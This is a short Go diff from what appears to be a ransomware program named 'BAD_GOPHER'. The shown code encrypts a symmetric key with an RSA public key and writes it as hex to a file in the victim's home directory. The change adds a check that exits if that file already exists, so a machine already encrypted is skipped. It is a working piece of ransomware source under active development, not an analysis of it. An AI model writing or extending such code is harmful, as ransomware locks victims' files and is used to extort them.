@@ -105,10 +105,16 @@ func main() {
 	ciphertext, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, append(append(magicBytes, currentTime...), key...), nil)
 
 	home, _ := os.UserHomeDir()
+	keyFilePath := home + "/BAD_GOPHER.txt"
+
+	// Check if key file exists, if so exit program b/c already encrypted
+	if _, err := os.Stat(keyFilePath); err == nil {
+		fmt.Printf("Key file exists, exiting")
+		return
+	}
 
 	// Save the decryption key and other information to the disk
-	// TODO: check if key file exists, if so exit program b/c already encrypted
-	keyFile, _ := os.Create(home + "/BAD_GOPHER.txt")
+	keyFile, _ := os.Create(keyFilePath)
 	keyFile.WriteString(hex.EncodeToString(ciphertext))
 	keyFile.Close()
 
